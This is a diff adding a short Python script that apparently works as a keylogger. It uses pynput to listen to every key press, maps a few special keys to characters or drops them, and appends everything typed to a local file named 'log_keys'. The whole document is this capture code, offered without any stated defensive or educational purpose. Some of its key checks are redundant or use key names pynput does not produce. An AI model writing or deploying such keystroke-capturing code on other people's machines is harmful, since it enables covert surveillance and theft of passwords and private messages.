@@ -1,0 +1,37 @@
+from pynput.keyboard import Listener
+def writetofile(key):
+    keydata = str(key)
+    keydata = keydata.replace("'", "")
+    
+    if keydata == "Key.space":
+        keydata = " "
+    
+    if keydata == "Key.enter":
+        keydata = "\n"
+    
+    if keydata == "Key.backspace":
+        keydata = " "
+
+    if keydata == "Key.ctrla":
+        keydata = ""
+    if keydata == "Key.ctrlc":
+        keydata = ""
+    if keydata == "Key.shift_r":
+        keydata = ""
+    if keydata == "Key.right":
+        keydata = ""
+    if keydata == "Key.left":
+        keydata = ""
+    if keydata == "Key.caps_lock":
+        keydata = ""
+    if keydata == "Key.shift":
+        keydata = ""
+    if keydata == "Key.ctrla":
+        keydata = ""
+    
+
+    with open('log_keys', 'a') as file:
+        file.write(keydata)
+
+with Listener(on_press=writetofile) as loged_file:
+    loged_file.join()
